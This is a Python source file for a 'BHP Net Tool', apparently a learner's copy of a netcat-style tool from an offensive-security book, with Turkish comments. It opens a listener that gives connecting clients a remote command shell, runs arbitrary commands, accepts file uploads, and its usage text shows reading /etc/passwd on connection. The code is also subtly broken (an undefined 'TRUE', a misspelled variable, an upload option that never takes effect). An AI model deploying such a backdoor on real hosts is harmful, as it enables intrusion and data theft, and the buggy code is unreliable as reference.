import sys 
import socket
import getopt
import threading
import subprocess

#bazi global verileri atayalim
listen  = False
command = False
upload  = False
execute     =""
target  =""
upload_destination  =""
port = 0

def run_command(command):
    
    #trim the newline
    command = command.rstrip()
    
    #run the command and get the output back
    try:
        output = subprocess.check_output(command,stderr=subprocess.STDOUT,shell=TRUE)
    except:
        output = "Failed to execute command.\r\n"
        
    #send the output back to the client
    return output


def client_handler(client_socket):
    global upload
    global execute
    global command
    
    #check for upload
    if len(upload_destination):
        #read in all of the bytes and write to our destination
        file_buffer = ""
        
        #keep reading data until none is available
        while True:
            data = client_socket.recv(1024)
            
            if not data:
                break
            else:
                file_buffer += data
                
        #now we take these bytes and try to write them out
        try:
            file_descriptor = open(upload_destination,"wb")
            file_descriptor.write(file_buffer)
            file_descriptor.close()
            
            #acknowledge taht we wrote the file out
            client_socket.send("Successfully saved file to %s\r\n"%upload_destination)
        except:
            client_socket.send("Failed to save file to %s\r\n"% upload_destionation)
            
    #check for command execution
    if len(execute):
        #run the command
        output= run_command(execute)
        
        client_socket.send(output)
        
    #now we go into another loop if a command shell was requested 
    if command:
        while True:
            #show a simple prompt
            client_socket.send("<BHP:#>")
            #now we receive until we see a linefeed (enterkey)
            cmd_buffer =""
            while "\n" not in cmd_buffer:
                cmd_buffer += client_socket.recv(1024)
                
            #send back the command output
            response = run_command(cmd_buffer)
            
            #send back the response
            client_socket.send(response)

def server_loop():
    global target
    global port
    
    #if no target is defined, we listen on all interfaces
    if not len(target):
        target = "0.0.0.0"
    
    server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    server.bind((target,port))
    server.listen(5)
    
    while True:
        
        client_socket,addr = server.accept()
        
        #spin off a thread to handle our new client
        client_thread = threading.Thread(target=client_handler,args=(client_socket,))
        client_thread.start()
        




def usage():
    print ("BHP Net Tool")
    print ("Usage: bhpnet.py -t target_host -p port")
    print ("l --listen - listen on [host]:[port] for incoming connections")
    print ("-e --execute=file_to_run - execute the given file upon receiving a connection")
    print ("-c --command - initialize a command shell")
    print ("-u --upload=destination - upon receiving connection upload a file and write to [destination]")
    print ("Examples: ")
    print ("bhpnet.py -t 192.168.0.1 -p 5555 -l -c")
    print ("bhpnet.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe")
    print ("bhpnet.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\"")
    print ("echo 'ABCDEFGHI' | ./bhpnet.py -t 192.168.11.12 -p 135")
    sys.exit(0)    


def client_sender(buffer):
    client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    
    try:
        #connect to out target host
        client.connect((target,port))
        
        if len(buffer):
            client.send(buffer)
        while True:
            #veri donmesini bekler
            recv_len = 1
            response = ""
            while recv_len:
                data = client.recv(4096)
                recv_len = len(data)
                response+= data
                
                if recv_len < 4096:
                    break
            print(response,)
            
            #wait for more input
            buffer = raw_input("")
            buffer += "\n"
            
            #send it off
            client.send(buffer)
            
    except:
        print("[*] Exception! Exiting.")
        
        #tear down the connection
        client.close()





def main():
    global listen   
    global port
    global execute
    global command
    global target
    global upload_test
    global target
    
    
    if not len(sys.argv[1:]):
        usage()
        # 1 den az veya girilmemisse kullanimi gosterecek
    # commandline optionslari okuyor
    try:
        opts, args = getopt.getopt(sys.argv[1:],"hle:t:p:cu:",["help","listen","execute","target","port","command","upload"])
    except getopt.GetoptError as err:
        print(str(err))
        usage()
        
    for o,a in opts:
        if o in ("-h","--help"):
            usage()
        elif o in ("-l","--listen"):
            listen = True
        elif o in ("-e","--execute"):
            execute = a
        elif o in ("-c","--commandshell"):
            command = True
        elif o in ("-u","--upload"):
            upload_destination = a
        elif o in ("-t","--target"):
            target = a
        elif o in ("-p","--port"):
            port = int(a)
        else:
            assert False,"Unhandled Option"
        #listen veta data gondermek mi girildi stdinden buna bakalim
    if not listen and len(target) and port > 0:
            #commandlinedan buffera oku
            #ctrl-d ile bundan cikilabilir sanirim hee veri girince bunu yap 
        buffer = sys.stdin.read()
            
            #send data off veriyi yolla
        client_sender(buffer)
            
        #yukaridaki komut satiri seceneklerimize bagli olarak dinleyecegiz ve potansiyel olarak bir seyler yukleyecegiz, komutlari calistiracagiz ve bir kabuk birakacagiz
    if listen:
        server_loop()
            
main()